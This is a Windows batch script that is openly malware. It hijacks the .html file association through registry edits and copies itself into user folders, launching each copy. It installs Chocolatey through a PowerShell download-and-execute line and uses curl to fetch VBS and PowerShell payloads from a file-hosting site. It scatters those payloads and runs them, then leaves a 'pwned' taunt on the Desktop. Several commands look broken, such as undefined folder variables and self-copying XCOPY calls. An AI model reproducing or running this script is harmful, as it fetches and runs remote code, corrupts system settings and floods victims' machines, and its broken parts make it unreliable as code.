@echo off
set extension=.html
set batfile=%0

assoc %extension%=%random%%random%%random%%random%e%random%

ftype %random%%random%%random%%random%e%random%="%batfile%" "%%1"

reg add "HKCR\%random%%random%%random%%random%e%random%\DefaultIcon" /ve /d "%batfile%,0" /f

reg add "HKCR\%random%%random%%random%%random%e%random%\shell" /ve /d "open" /f

reg add "HKCR\%random%%random%%random%%random%e%random%\shell\open\command" /ve /d "%batfile% \"%%1\"" /f

echo File extension %extension% associated with %batfile%
XCOPY %Documents% %Documents%
XCOPY %Desktop% %Desktop%
XCOPY %Downloads% %Downloads%
XCOPY %User% %User%
XCOPY %Pictures% %Pictures%
COPY %0 %random%%random%%random%%random%.bat
START %random%%random%%random%%random%.bat
COPY %0 %User%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
START %User%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
COPY %0 %Desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
START %Desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
COPY %0 %Downloads%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
START %Downloads%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
COPY %0 %Pictures%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
START %Pictures%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
COPY %0 %Music%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
START %Music%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
COPY %0 %Videos%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
START %Videos%\%random%%random%%random%%random%\%random%%random%%random%%random%.bat
if not exist "%SystemRoot%\System32\chocolatey.exe" (
    powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
)

choco install curl -y
curl -L https://litter.catbox.moe/98d258.txt -o pwned.vbs
curl -L https://litter.catbox.moe/vx7j2h.txt -o shit.ps1
COPY pwned.vbs %random%%random%%random%%random%.vbs
COPY pwned.vbs %User%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
COPY pwned.vbs %Desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
COPY pwned.vbs %Downloads%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
COPY pwned.vbs %Pictures%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
COPY pwned.vbs %Music%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
COPY pwned.vbs %Videos%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
COPY shit.ps1 %random%%random%%random%%random%.ps1
COPY shit.ps1 %User%\%random%%random%%random%%random%\%random%%random%%random%%random%.ps1
COPY shit.ps1 %Desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%.ps1
COPY shit.ps1 %Downloads%\%random%%random%%random%%random%\%random%%random%%random%%random%.ps1
COPY shit.ps1 %Pictures%\%random%%random%%random%%random%\%random%%random%%random%%random%.ps1
COPY shit.ps1 %Music%\%random%%random%%random%%random%\%random%%random%%random%%random%.ps1
COPY shit.ps1 %Videos%\%random%%random%%random%%random%\%random%%random%%random%%random%.ps1
START pwned.vbs
START shit.ps1
START %random%%random%%random%%random%.vbs
START %User%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Downloads%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Pictures%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Music%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Videos%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %random%%random%%random%%random%.ps1
START %User%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Downloads%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Pictures%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Music%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
START %Videos%\%random%%random%%random%%random%\%random%%random%%random%%random%.vbs
SET u7=%Desktop%\pwned.txt
ECHO get epix hax0r3d > %u7%
START %u7%
